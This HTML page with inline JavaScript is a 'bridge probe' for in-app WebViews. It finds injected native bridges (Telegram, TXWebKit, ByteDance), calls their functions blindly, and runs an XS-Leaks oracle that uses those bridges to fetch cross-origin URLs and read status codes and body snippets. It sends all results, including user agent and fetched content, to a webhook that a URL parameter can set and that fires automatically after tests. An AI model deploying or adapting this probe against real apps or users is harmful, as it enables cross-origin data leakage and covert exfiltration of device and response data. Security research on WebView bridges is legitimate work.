<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Bridge Probe (Generic)</title>
  <style>
    body{font-family:system-ui;padding:16px;max-width:960px;margin:0 auto}
    .grid{display:grid;grid-template-columns:1fr;gap:12px}
    .card{border:1px solid #ddd;border-radius:8px;padding:12px}
    .ok{background:#e6ffed;border-color:#b7f5c6}
    .warn{background:#fff5f0;border-color:#ffd6cc}
    pre{background:#f6f8fa;padding:10px;border-radius:6px;white-space:pre-wrap}
    .row{display:flex;gap:8px;flex-wrap:wrap}
    button{padding:8px 12px;cursor:pointer;border:none;border-radius:6px}
    code{background:#f0f3f6;padding:2px 6px;border-radius:4px}
    /* Mobile-friendly styles */
    @media (max-width: 600px) {
      body{padding:12px}
      .card{padding:10px}
      button{min-height:44px;font-size:16px;width:100%}
    }
  </style>
</head>
<body>
  <h1>Generic Bridge Probe</h1>
  <p>Open this page inside any in-app WebView to detect injected JS bridges or special objects. Then tap Run.</p>
  
  <!-- One-Click Full Test -->
  <div class="card" style="background:#e6f3ff;border:2px solid #0066cc;margin-bottom:16px;position:sticky;top:0;z-index:10">
    <h3 style="margin-top:0;margin-bottom:12px;color:#0066cc">🚀 一键测试所有（推荐）</h3>
    <button id="runAll" style="background:#0066cc;color:white;font-weight:bold;padding:16px 24px;font-size:18px;width:100%;display:block;min-height:50px;box-shadow:0 4px 6px rgba(0,102,204,0.3);transition:all 0.2s">▶ 运行所有测试并发送</button>
    <small style="color:#666;display:block;margin-top:12px;line-height:1.5">自动运行：Bridge扫描 → 网络测试 → Oracle测试 → 汇总结果 → 发送到webhook</small>
  </div>

  <!-- Core Functions -->
  <div class="card">
    <h3 style="margin-top:0">Core Detection</h3>
    <div class="row">
      <button id="run">Run</button>
      <button id="copy">Copy JSON</button>
    </div>
    <small style="color:#666">Click "Run" to scan for bridges.</small>
  </div>

  <!-- Quick Network Tests -->
  <div class="card">
    <h3 style="margin-top:0">Quick Network Tests</h3>
    <div class="row">
      <button id="safeGet">Safe GET</button>
      <button id="multi">Multi-domain</button>
      <button id="readBody">Read body</button>
    </div>
  </div>

  <!-- Oracle XS-Leaks Test -->
  <div class="card">
    <h3 style="margin-top:0">Oracle XS-Leaks Test</h3>
    <div style="margin-top:8px">
      <label><strong>测试目标 URL（每行一个）</strong></label>
      <textarea id="oracleTargets" style="width:100%;min-height:80px;padding:8px">https://httpbin.org/status/401
https://httpbin.org/status/403
https://httpbin.org/anything</textarea>
      <small style="color:#666">输入你想测试的URL。工具会用Bridge和fetch()同时访问，对比返回结果。</small>
    </div>
    <div class="row" style="margin-top:8px">
      <button id="runOracle">▶ 运行Oracle测试</button>
      <label><input type="checkbox" id="oracleIncludeFetch" checked /> 同时测试fetch()基线</label>
    </div>
  </div>

  <!-- Advanced Tests -->
  <div class="card">
    <h3 style="margin-top:0">Advanced Tests</h3>
    <div class="row">
      <button id="bridgePost">Bridge POST</button>
    </div>
  </div>

  <!-- Webhook Data Collection -->
  <div class="card">
    <h3 style="margin-top:0">Webhook 数据收集</h3>
    <div style="margin-top:8px">
      <div class="row">
        <input id="hook" placeholder="https://webhook.site/your-id" style="flex:1;min-width:200px;padding:8px" />
        <button id="send">📤 发送到 Webhook</button>
      </div>
      <small style="color:#666;display:block;margin-top:4px">所有测试结果（探针、Oracle、网络测试）都会发送到 webhook</small>
    </div>
  </div>
  <div id="summary" class="card"></div>
  <div class="grid">
    <div class="card"><h3>Findings</h3><pre id="out">Ready.</pre></div>
    <div class="card"><h3>Raw</h3><pre id="raw"></pre></div>
    <div class="card">
      <h3>Custom request tester</h3>
      <div class="row" style="gap:6px">
        <select id="m" style="padding:8px">
          <option>GET</option>
          <option>POST</option>
        </select>
        <input id="u" placeholder="https://httpbin.org/get" style="flex:1;min-width:260px;padding:8px" />
      </div>
      <div class="row" style="margin-top:6px;gap:6px">
        <input id="h" placeholder="Header: X-Test=1; Accept=*/*" style="flex:1;min-width:260px;padding:8px" />
      </div>
      <div class="row" style="margin-top:6px;gap:6px">
        <textarea id="b" placeholder="Body (for POST)" style="flex:1;min-height:80px;padding:8px"></textarea>
      </div>
      <div class="row" style="margin-top:8px">
        <button id="sendReq">Send</button>
      </div>
      <pre id="reqOut" style="margin-top:8px"></pre>
    </div>
  </div>
<script>
(function(){
  const out = document.getElementById('out');
  const raw = document.getElementById('raw');
  const summary = document.getElementById('summary');
  const results = { runs: [] };
  const patterns = [
    /telegram|tg|webapp/i,
    /bridge|native|app|sdk|jsi|webview/i,
  ];
  function looksSuspicious(name, value){
    if (!name) return false;
    if (patterns.some(p=>p.test(name))) return true;
    if (value && typeof value === 'object'){
      const s = Object.keys(value).join(',');
      if (/bridge|native|invoke|postMessage|sdk/i.test(s)) return true;
    }
    return false;
  }
  function safeCall(fn){
    try{ const r = fn(); return { ok:true, value: String(r).slice(0,200) }; }
    catch(e){ return { ok:false, error: String(e.message||e).slice(0,200) }; }
  }
  function probe(){
    const t0 = performance.now();
    const findings = [];
    const seen = new Set();
    const known = {
      hasTelegramWebApp: !!(window.Telegram && window.Telegram.WebApp),
      hasTelegramWebview: !!window.TelegramWebview,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      time: new Date().toISOString(),
    };
    for (const k in window){
      if (seen.has(k)) continue; seen.add(k);
      let v; try{ v = window[k]; }catch{ v = undefined; }
      const sus = looksSuspicious(k, v);
      if (!sus) continue;
      const entry = { name:k, type: typeof v };
      if (typeof v === 'function'){
        entry.sample = safeCall(()=>v());
      } else if (v && typeof v === 'object'){
        const keys = Object.keys(v).slice(0,8);
        entry.keys = keys;
        for (const m of keys){
          if (typeof v[m] === 'function'){
            entry.call = { method:m, result: safeCall(()=>v[m]()) };
            break;
          }
        }
      }
      findings.push(entry);
      if (findings.length>=100) break;
    }
    const t1 = performance.now();
    const report = { known, findings, durationMs: +(t1-t0).toFixed(2) };
    results.runs.push({ type:'probe', report });
    return report;
  }
  let last = null;
  document.getElementById('run').onclick = ()=>{
    last = probe();
    const count = last.findings.length;
    summary.className = 'card ' + (count>0 ? 'warn' : 'ok');
    summary.innerHTML = count>0
      ? `Possible bridges found: <strong>${count}</strong> (review carefully)`
      : `No obvious bridges detected.`;
    out.textContent = last.findings.map((f,i)=>`${i+1}. ${f.name} [${f.type}]` + (f.keys?`\n   keys: ${f.keys.join(', ')}`:'') + (f.call?`\n   call: ${f.call.method} -> ${JSON.stringify(f.call.result)}`:'' )).join('\n\n') || 'None';
    raw.textContent = JSON.stringify(last, null, 2);
    // Auto-send to webhook if URL is preset
    try{
      const webhookUrl = document.getElementById('hook')?.value?.trim();
      if (webhookUrl) {
        setTimeout(()=>{
          const btn = document.getElementById('send');
          if (btn) btn.click();
        }, 500);
      }
    }catch{}
  };
  async function tryBridgeGet(url){
    const out = { url };
    try{
      if (typeof window.TXWebKitNativeFetch === 'function'){
        const p = window.TXWebKitNativeFetch(url);
        const val = await Promise.race([
          Promise.resolve(p).then(()=>"ok"),
          new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 5000))
        ]);
        out.via = 'TXWebKitNativeFetch';
        out.result = val;
      } else {
        const r = await Promise.race([
          fetch(url, { mode:'no-cors', cache:'no-store', credentials:'omit' }).then(()=>"ok"),
          new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 5000))
        ]);
        out.via = 'fetch';
        out.result = r;
      }
    }catch(e){
      out.error = String(e.message||e);
    }
    return out;
  }
  function pushRaw(obj){
    // 也保存到results.runs中，避免被覆盖丢失
    results.runs.push({ type:'extra', data: obj, timestamp: new Date().toISOString() });
    const merged = Object.assign({}, last||{}, { extra: (last&&last.extra)||[] });
    merged.extra = merged.extra || [];
    merged.extra.push(obj);
    last = merged;
    raw.textContent = JSON.stringify(last, null, 2);
  }
  
  // Auto-send to webhook if URL is preset (can be disabled for batch testing)
  let autoSendEnabled = true;
  function autoSendWebhook(){
    if (!autoSendEnabled) return;
    try{
      const hookInput = document.getElementById('hook');
      const webhookUrl = hookInput?.value?.trim();
      if (webhookUrl) {
        setTimeout(()=>{
          const sendBtn = document.getElementById('send');
          if (sendBtn) sendBtn.click();
        }, 300);
      }
    }catch{}
  }
  
  // Run all tests sequentially and send summary
  async function runAllTests(){
    const hookInput = document.getElementById('hook');
    const webhookUrl = hookInput?.value?.trim();
    
    summary.className = 'card';
    summary.innerHTML = `⏳ 正在运行所有测试，请稍候...<br><small>这可能需要几分钟时间</small>`;
    out.textContent = '正在运行所有测试...';
    
    // Disable auto-send during batch testing
    autoSendEnabled = false;
    const startTime = Date.now();
    
    try{
      // 1. Probe scan
      summary.innerHTML = `⏳ 步骤 1/6: 正在扫描 Bridge...`;
      last = probe();
      const count = last.findings.length;
      summary.innerHTML = count>0
        ? `Possible bridges found: <strong>${count}</strong> (review carefully)`
        : `No obvious bridges detected.`;
      out.textContent = last.findings.map((f,i)=>`${i+1}. ${f.name} [${f.type}]` + (f.keys?`\n   keys: ${f.keys.join(', ')}`:'') + (f.call?`\n   call: ${f.call.method} -> ${JSON.stringify(f.call.result)}`:'' )).join('\n\n') || 'None';
      raw.textContent = JSON.stringify(last, null, 2);
      await new Promise(r=>setTimeout(r, 500));
      
      // 2. Safe GET
      summary.innerHTML = `⏳ 步骤 2/6: 正在测试 Safe GET...`;
      const safeGetUrl = 'https://www.cloudflare.com/cdn-cgi/trace';
      const safeGetRes = await tryBridgeGet(safeGetUrl);
      pushRaw({ type:'safe-get', res: safeGetRes });
      await new Promise(r=>setTimeout(r, 500));
      
      // 3. Multi-domain
      summary.innerHTML = `⏳ 步骤 3/6: 正在测试多域名...`;
      const multiUrls = [
        'https://example.com/favicon.ico',
        'https://www.cloudflare.com/cdn-cgi/trace',
        location.origin + '/index.html'
      ];
      const multiResults = [];
      for (const u of multiUrls){ multiResults.push(await tryBridgeGet(u)); }
      pushRaw({ type:'multi-domain', results: multiResults });
      await new Promise(r=>setTimeout(r, 500));
      
      // 4. Read body
      summary.innerHTML = `⏳ 步骤 4/6: 正在测试读取响应体...`;
      const readBodyInfo = { type:'read-body', url:'https://httpbin.org/anything' };
      try{
        let status = null, bodySnippet = null, via = null;
        if (typeof window.TXWebKitNativeFetch === 'function'){
          const r = await Promise.race([
            Promise.resolve(window.TXWebKitNativeFetch(readBodyInfo.url)),
            new Promise((_,r)=>setTimeout(()=>r(new Error('timeout')),7000))
          ]);
          if (r && typeof r === 'object'){
            if (typeof r.status === 'number') status = r.status;
            if (typeof r.text === 'function'){
              try{ const t = await r.text(); bodySnippet = String(t).slice(0,500); }catch{}
            }
          }
          via = 'TXWebKitNativeFetch';
        }
        if (bodySnippet==null){
          const fr = await fetch(readBodyInfo.url, { mode:'cors', cache:'no-store', credentials:'omit' });
          status = fr.status; const t = await fr.text(); bodySnippet = t.slice(0,500); via = via || 'fetch';
        }
        readBodyInfo.via = via; readBodyInfo.status = status; readBodyInfo.bodySnippet = bodySnippet;
      }catch(e){ readBodyInfo.error = String(e.message||e); }
      pushRaw(readBodyInfo);
      await new Promise(r=>setTimeout(r, 500));
      
      // 5. Bridge POST
      summary.innerHTML = `⏳ 步骤 5/6: 正在测试 Bridge POST...`;
      const bridgePostInfo = { type:'bridge-post', url:'https://httpbin.org/post', method:'POST', headers:{'X-Test':'bridge'}, body:'{"msg":"hello_bridge"}' };
      try{
        if (typeof window.TXWebKitNativeFetch === 'function'){
          const p = window.TXWebKitNativeFetch(bridgePostInfo.url, { method:'POST', headers: bridgePostInfo.headers, body: bridgePostInfo.body });
          await Promise.race([Promise.resolve(p), new Promise((_,r)=>setTimeout(()=>r(new Error('timeout')),6000))]);
          bridgePostInfo.via = 'TXWebKitNativeFetch';
          bridgePostInfo.result = 'ok';
        }else{
          bridgePostInfo.error = 'TXWebKitNativeFetch not found';
        }
      }catch(e){ bridgePostInfo.error = String(e.message||e); }
      // Save to results.runs directly (not just extra)
      results.runs.push({ type:'bridge-post', data: bridgePostInfo, timestamp: new Date().toISOString() });
      pushRaw(bridgePostInfo);
      await new Promise(r=>setTimeout(r, 500));
      
      // 6. Oracle test
      summary.innerHTML = `⏳ 步骤 6/6: 正在运行 Oracle XS-Leaks 测试...`;
      await runOracleInline();
      await new Promise(r=>setTimeout(r, 500));
      
      // Re-enable auto-send
      autoSendEnabled = true;
      
      // Wait a bit more to ensure all async operations complete
      await new Promise(r=>setTimeout(r, 1000));
      
      // Generate summary
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Collect all test results including extra items
      const allTestResults = [];
      for (const run of results.runs) {
        allTestResults.push(run);
      }
      // Also include last.extra if exists
      if (last && last.extra && Array.isArray(last.extra)) {
        for (const item of last.extra) {
          // Avoid duplicates - check if already in allTestResults
          const exists = allTestResults.some(r => 
            r.type === 'extra' && JSON.stringify(r.data) === JSON.stringify(item)
          );
          if (!exists) {
            allTestResults.push({ type: 'extra', data: item, timestamp: new Date().toISOString() });
          }
        }
      }
      
      const summaryReport = {
        type: 'full-test-summary',
        timestamp: new Date().toISOString(),
        durationMs: duration,
        userAgent: navigator.userAgent,
        allRuns: results.runs, // Structured runs
        allTestResults: allTestResults, // All results including extra
        lastRun: last,
        summary: {
          totalTests: results.runs.length,
          totalResults: allTestResults.length,
          bridgeCount: last?.findings?.length || 0,
          testTypes: results.runs.map(r=>r.type),
          detectedBridges: last?.findings?.filter(f => 
            /bridge|native|invoke/i.test(f.name)
          ).map(f => f.name) || []
        }
      };
      
      // Send summary to webhook
      if (webhookUrl) {
        summary.innerHTML = `⏳ 正在发送汇总结果到 webhook...`;
        try{
          const payload = {
            ...summaryReport,
            rawOutput: raw.textContent
          };
          
          try{
            const resp = await fetch(webhookUrl, { 
              method:'POST', 
              mode:'cors',
              headers:{'Content-Type':'application/json'}, 
              body: JSON.stringify(payload, null, 2) 
            });
            summary.className = 'card ok';
            summary.innerHTML = `✅ 所有测试完成！汇总结果已发送到 webhook。<br><strong>测试时长：</strong> ${(duration/1000).toFixed(1)}秒<br><strong>测试数量：</strong> ${summaryReport.summary.totalTests}个<br><strong>检测到的Bridge：</strong> ${summaryReport.summary.bridgeCount}个<br><strong>状态码：</strong> <code>${resp.status}</code>`;
          } catch(corsError) {
            await fetch(webhookUrl, { 
              method:'POST', 
              mode:'no-cors',
              headers:{'Content-Type':'application/json'}, 
              body: JSON.stringify(payload, null, 2) 
            });
            summary.className = 'card ok';
            summary.innerHTML = `✅ 所有测试完成！汇总结果已发送到 webhook（no-cors模式）。<br><strong>测试时长：</strong> ${(duration/1000).toFixed(1)}秒<br><strong>测试数量：</strong> ${summaryReport.summary.totalTests}个<br><strong>检测到的Bridge：</strong> ${summaryReport.summary.bridgeCount}个`;
          }
        }catch(e){
          summary.className = 'card warn';
          summary.innerHTML = `✅ 所有测试完成，但发送到 webhook 失败：<code>${String(e.message||e)}</code><br><strong>测试时长：</strong> ${(duration/1000).toFixed(1)}秒<br><strong>测试数量：</strong> ${summaryReport.summary.totalTests}个`;
        }
      } else {
        summary.className = 'card ok';
        summary.innerHTML = `✅ 所有测试完成！<br><strong>测试时长：</strong> ${(duration/1000).toFixed(1)}秒<br><strong>测试数量：</strong> ${summaryReport.summary.totalTests}个<br><strong>检测到的Bridge：</strong> ${summaryReport.summary.bridgeCount}个<br><small>请填写 Webhook URL 以自动发送结果</small>`;
      }
      
      // Update display
      raw.textContent = JSON.stringify(summaryReport, null, 2);
      
    }catch(e){
      autoSendEnabled = true;
      summary.className = 'card warn';
      summary.innerHTML = `❌ 测试过程中出错：<code>${String(e.message||e)}</code>`;
    }
  }
  
  document.getElementById('runAll').onclick = runAllTests;
  document.getElementById('safeGet').onclick = async ()=>{
    const url = 'https://www.cloudflare.com/cdn-cgi/trace';
    const res = await tryBridgeGet(url);
    summary.className = 'card';
    summary.innerHTML = `Safe GET → ${url}<br>via: <code>${res.via||'-'}</code> result: <code>${res.result||'-'}</code> ${res.error?`error: <code>${res.error}</code>`:''}`;
    pushRaw({ type:'safe-get', res });
    autoSendWebhook();
  };
  document.getElementById('multi').onclick = async ()=>{
    const urls = [
      'https://example.com/favicon.ico',
      'https://www.cloudflare.com/cdn-cgi/trace',
      location.origin + '/index.html'
    ];
    const outAll = [];
    for (const u of urls){ outAll.push(await tryBridgeGet(u)); }
    const lines = outAll.map(o=>`${o.url} → ${o.via||'-'} ${o.result||o.error||'-'}`).join('\n');
    out.textContent = lines;
    pushRaw({ type:'multi-domain', results: outAll });
    autoSendWebhook();
  };
  function parseHeaders(s){
    const o = {};
    (s||'').split(';').map(x=>x.trim()).filter(Boolean).forEach(kv=>{
      const i = kv.indexOf('=');
      if (i>0){ const k = kv.slice(0,i).trim(); const v = kv.slice(i+1).trim(); if (k) o[k]=v; }
    });
    return o;
  }
  document.getElementById('sendReq').onclick = async ()=>{
    const reqOut = document.getElementById('reqOut');
    const method = document.getElementById('m').value;
    const url = (document.getElementById('u').value||'').trim();
    const headers = parseHeaders(document.getElementById('h').value||'');
    const body = document.getElementById('b').value||'';
    if (!url) { reqOut.textContent = 'Enter URL'; return; }
    const info = { type:'custom-request', url, method, headersPresent: Object.keys(headers).length>0, bodyBytes: body.length };
    try{
      if (typeof window.TXWebKitNativeFetch === 'function' && method==='GET' && !body){
        const p = window.TXWebKitNativeFetch(url);
        await Promise.race([Promise.resolve(p), new Promise((_,r)=>setTimeout(()=>r(new Error('timeout')),6000))]);
        info.via = 'TXWebKitNativeFetch';
        info.result = 'ok';
      } else {
        const init = { method, mode:'no-cors', cache:'no-store', credentials:'omit', headers };
        if (method==='POST') init.body = body;
        await Promise.race([fetch(url, init), new Promise((_,r)=>setTimeout(()=>r(new Error('timeout')),6000))]);
        info.via = 'fetch';
        info.result = 'ok';
      }
    }catch(e){ info.error = String(e.message||e); }
    pushRaw(info);
    reqOut.textContent = JSON.stringify(info, null, 2);
    autoSendWebhook();
  };
  document.getElementById('send').onclick = async ()=>{
    const url = (document.getElementById('hook').value||'').trim();
    if (!url) return alert('请输入Webhook URL');
    
    // 收集所有测试结果
    const allResults = [];
    // 1. 所有runs（探针、Oracle测试）
    for (const run of results.runs) {
      allResults.push(run);
    }
    // 2. last对象（可能包含extra数组）
    if (last) {
      allResults.push(last);
      // 如果last有extra，也要包含
      if (last.extra && Array.isArray(last.extra)) {
        for (const item of last.extra) {
          allResults.push(item);
        }
      }
    }
    
    const payload = {
      allRuns: results.runs,
      lastRun: last,
      allResults: allResults, // 包含所有结果
      rawOutput: raw.textContent, // 原始JSON输出
      timestamp: new Date().toISOString()
    };
    
    summary.className = 'card';
    summary.innerHTML = `⏳ 正在发送到 webhook...`;
    
    try{
      // 先尝试CORS模式（可以读取响应状态）
      try{
        const resp = await fetch(url, { 
          method:'POST', 
          mode:'cors',
          headers:{'Content-Type':'application/json'}, 
          body: JSON.stringify(payload, null, 2) 
        });
        summary.className = 'card ok';
        summary.innerHTML = `✅ Webhook发送成功：状态码 <code>${resp.status}</code>，已发送 ${allResults.length} 个测试结果。<br><small>包含：${results.runs.length} 个runs + ${last?.extra?.length||0} 个额外结果</small>`;
      } catch(corsError) {
        // CORS失败，改用no-cors模式（能发送但无法读取响应）
        await fetch(url, { 
          method:'POST', 
          mode:'no-cors',
          headers:{'Content-Type':'application/json'}, 
          body: JSON.stringify(payload, null, 2) 
        });
        summary.className = 'card ok';
        summary.innerHTML = `✅ Webhook已发送（no-cors模式，无法读取响应状态）。<br><small>已发送 ${allResults.length} 个测试结果</small>`;
      }
    }catch(e){
      summary.className = 'card warn';
      summary.innerHTML = `❌ Webhook发送失败：<code>${String(e.message||e)}</code><br><small>请检查URL是否正确，或是否允许跨域请求</small>`;
    }
  };
  document.getElementById('bridgePost').onclick = async ()=>{
    const info = { type:'bridge-post', url:'https://httpbin.org/post', method:'POST', headers:{'X-Test':'bridge'}, body:'{"msg":"hello_bridge"}' };
    try{
      if (typeof window.TXWebKitNativeFetch !== 'function') throw new Error('TXWebKitNativeFetch not found');
      const p = window.TXWebKitNativeFetch(info.url, { method:'POST', headers: info.headers, body: info.body });
      await Promise.race([Promise.resolve(p), new Promise((_,r)=>setTimeout(()=>r(new Error('timeout')),6000))]);
      info.via = 'TXWebKitNativeFetch';
      info.result = 'ok';
    }catch(e){ info.error = String(e.message||e); }
    pushRaw(info);
    summary.className = 'card';
    summary.innerHTML = `Bridge POST → ${info.url} result: <code>${info.result||info.error||'-'}</code>`;
    autoSendWebhook();
  };
  document.getElementById('readBody').onclick = async ()=>{
    const info = { type:'read-body', url:'https://httpbin.org/anything' };
    try{
      let status = null, bodySnippet = null, via = null;
      if (typeof window.TXWebKitNativeFetch === 'function'){
        const r = await Promise.race([
          Promise.resolve(window.TXWebKitNativeFetch(info.url)),
          new Promise((_,r)=>setTimeout(()=>r(new Error('timeout')),7000))
        ]);
        // Best-effort: if bridge returns Response-like
        if (r && typeof r === 'object'){
          if (typeof r.status === 'number') status = r.status;
          if (typeof r.text === 'function'){
            try{ const t = await r.text(); bodySnippet = String(t).slice(0,500); }catch{}
          }
        }
        via = 'TXWebKitNativeFetch';
      }
      // Fallback to fetch (CORS-enabled endpoint)
      if (bodySnippet==null){
        const fr = await fetch(info.url, { mode:'cors', cache:'no-store', credentials:'omit' });
        status = fr.status; const t = await fr.text(); bodySnippet = t.slice(0,500); via = via || 'fetch';
      }
      info.via = via; info.status = status; info.bodySnippet = bodySnippet;
      summary.className = 'card';
      summary.innerHTML = `Read body → ${info.url}<br>via: <code>${via}</code> status: <code>${status}</code>`;
    }catch(e){ info.error = String(e.message||e); }
    pushRaw(info);
    autoSendWebhook();
  };
  document.getElementById('copy').onclick = ()=>{
    const text = raw.textContent || 'No data';
    navigator.clipboard.writeText(text).then(()=>{ alert('Copied'); });
  };

  // Oracle XS-Leaks test runner
  async function runOracleInline(){
    const targetsInput = document.getElementById('oracleTargets');
    const targets = (targetsInput?.value||'')
      .split(/\n+/).map(s=>s.trim()).filter(Boolean);
    if (targets.length === 0) {
      alert('请至少输入一个测试目标 URL');
      return;
    }
    function withTimeout(promise, ms){
      return Promise.race([
        Promise.resolve(promise),
        new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), ms))
      ]);
    }
    function getBridges(){
      const bridges = [];
      if (typeof window.TXWebKitNativeFetch === 'function'){
        bridges.push({ name:'TXWebKitNativeFetch', fn: (url, init)=>window.TXWebKitNativeFetch(url, init) });
      }
      if (window.TelegramWebview && typeof window.TelegramWebview.nativeFetch === 'function'){
        bridges.push({ name:'TelegramWebview.nativeFetch', fn: (url, init)=>window.TelegramWebview.nativeFetch(url, init) });
      }
      const hasByteInvoke = window.byted_mixrender_native && typeof window.byted_mixrender_native.invoke === 'function';
      const hasJS2 = window.JS2NativeBridge && typeof window.JS2NativeBridge._invokeMethod === 'function';
      const hasBDX = window.BDXBridge && typeof window.BDXBridge._invokeMethod === 'function';
      function toByteReq(url){ return { url, method:'GET', headers:{}, body:'' }; }
      function wrapMulti(invoke){
        const candidates = ['request','httpRequest','networkRequest','fetch','ttnetRequest','bytedRequest'];
        return (url)=>new Promise((resolve,reject)=>{
          const start = Date.now();
          const opt = toByteReq(url);
          let finished = false;
          const overallTimer = setTimeout(()=>{ if(!finished){ finished=true; reject(new Error('timeout')); } }, 7000);
          const tryOne = (idx)=>{
            if (finished) return;
            if (idx >= candidates.length){ finished=true; clearTimeout(overallTimer); return reject(new Error('no-method')); }
            const method = candidates[idx];
            let perDone = false;
            const perTimer = setTimeout(()=>{ if(!perDone){ perDone=true; tryOne(idx+1); } }, 1800);
            const cb = (resp)=>{
              if (finished || perDone) return; perDone = true; finished = true; clearTimeout(perTimer); clearTimeout(overallTimer);
              try{
                const parsed = (typeof resp==='string') ? JSON.parse(resp) : resp;
                resolve(Object.assign({ _methodUsed: method, _elapsedMs: Date.now()-start }, parsed||{}));
              }catch(e){ resolve({ _methodUsed: method, _elapsedMs: Date.now()-start, error: String(e&&e.message||e) }); }
            };
            try{
              // Prefer signature (method, options, cb); fallback (options, cb)
              if (invoke.length >= 3) invoke(method, opt, cb); else invoke(opt, cb);
            }catch{ tryOne(idx+1); }
          };
          tryOne(0);
        });
      }
      if (hasByteInvoke) bridges.push({ name:'byted_mixrender_native.invoke', fn: wrapMulti(window.byted_mixrender_native.invoke.bind(window.byted_mixrender_native)) });
      if (hasJS2) bridges.push({ name:'JS2NativeBridge._invokeMethod', fn: wrapMulti(window.JS2NativeBridge._invokeMethod.bind(window.JS2NativeBridge)) });
      if (hasBDX) bridges.push({ name:'BDXBridge._invokeMethod', fn: wrapMulti(window.BDXBridge._invokeMethod.bind(window.BDXBridge)) });
      return bridges;
    }
    async function tryFetch(url){
      try{
        const r = await withTimeout(fetch(url, { mode:'cors', credentials:'omit', cache:'no-store' }), 6000);
        return { method:'fetch', url, via:'fetch', status:r.status, ok:r.ok, fulfilled:true };
      }catch(e){ return { method:'fetch', url, via:'fetch', error: String(e&&e.message||e), fulfilled:false }; }
    }
    async function tryBridge(b, url){
      try{
        const r = await withTimeout(b.fn(url, { method:'GET' }), 6000);
        const out = { method:b.name, url, via:b.name, fulfilled:true };
        if (r && typeof r==='object'){
          if (typeof r.status==='number') out.status=r.status;
          if (typeof r.ok==='boolean') out.ok=r.ok;
          if (typeof r.body==='string') out.bodySnippet=r.body.slice(0,300);
          if (typeof r.data==='string') out.bodySnippet=r.data.slice(0,300);
          if (typeof r.code!=='undefined') out.errorCode=r.code;
          if (typeof r._methodUsed==='string') out.methodUsed=r._methodUsed;
        }
        return out;
      }catch(e){ return { method:b.name, url, via:b.name, error:String(e&&e.message||e), fulfilled:false }; }
    }
    
    function classifyLeak(event){
      const sig = { oracle:false, reasons:[] };
      if (event.method !== 'fetch' && event.fulfilled) {
        if (typeof event.status === 'number' || typeof event.bodySnippet === 'string'){
          sig.oracle = true; sig.reasons.push('bridge returned status/body');
        }
      }
      if (!event.fulfilled && event.error){
        if (/AUTH|TOKEN|CSRF|LOGIN|DENY|forbidden|unauthor/i.test(event.error)){
          sig.oracle = true; sig.reasons.push('bridge error mentions auth/state');
        }
      }
      if (typeof event.errorCode !== 'undefined'){
        sig.oracle = true; sig.reasons.push('bridge error code present');
      }
      return sig;
    }
    
    function summarizeOracle(all){
      const byUrl = {};
      for (const e of all){
        byUrl[e.url] = byUrl[e.url] || { url:e.url, total:0, oracle:0 };
        byUrl[e.url].total++;
        const c = classifyLeak(e);
        if (c.oracle) byUrl[e.url].oracle++;
      }
      const list = Object.values(byUrl);
      const oracleAny = list.some(x=>x.oracle>0);
      return { oracleAny, urls:list };
    }
    
    const bridges = getBridges();
    const includeFetch = document.getElementById('oracleIncludeFetch')?.checked !== false;
    const events = [];
    
    for (const u of targets){
      for (const b of bridges){ events.push(await tryBridge(b,u)); }
      if (includeFetch) events.push(await tryFetch(u));
    }
    
    const report = {
      type:'oracle-leak',
      meta: {
        time: new Date().toISOString(),
        ua: navigator.userAgent,
        bridges: bridges.map(b=>b.name),
        includeFetch
      },
      events,
      summary: summarizeOracle(events)
    };
    
    results.runs.push(report);
    last = report;
    
    const lines = events.map(e=>{
      const tag = (e.fulfilled? '✅ OK' : '❌ ERR');
      const leak = classifyLeak(e);
      return `${tag} ${e.method} ${e.url}` + (leak.oracle? ` ⚠️ [泄露: ${leak.reasons.join(', ')}]` : '');
    });
    out.textContent = lines.join('\n') || '无结果';
    raw.textContent = JSON.stringify(report, null, 2);
    
    const any = report.summary.oracleAny;
    summary.className = 'card ' + (any ? 'warn' : 'ok');
    summary.innerHTML = any
      ? `⚠️ Oracle泄露检测：在 <strong>${report.summary.urls.filter(x=>x.oracle>0).length}</strong> 个目标中发现Bridge比fetch()泄露了更多信息。`
      : `✅ Oracle测试完成：未发现明显的泄露信号。`;
    autoSendWebhook();
  }
  
  document.getElementById('runOracle').onclick = runOracleInline;
  
  // Parse URL parameters and auto-fill webhook URL
  (function(){
    try{
      const p = new URLSearchParams(location.search);
      const webhookUrl = p.get('webhook');
      if (webhookUrl) {
        const hookInput = document.getElementById('hook');
        if (hookInput) {
          hookInput.value = decodeURIComponent(webhookUrl);
        }
      }
    }catch{}
  })();
})();
</script>
</body>
</html>
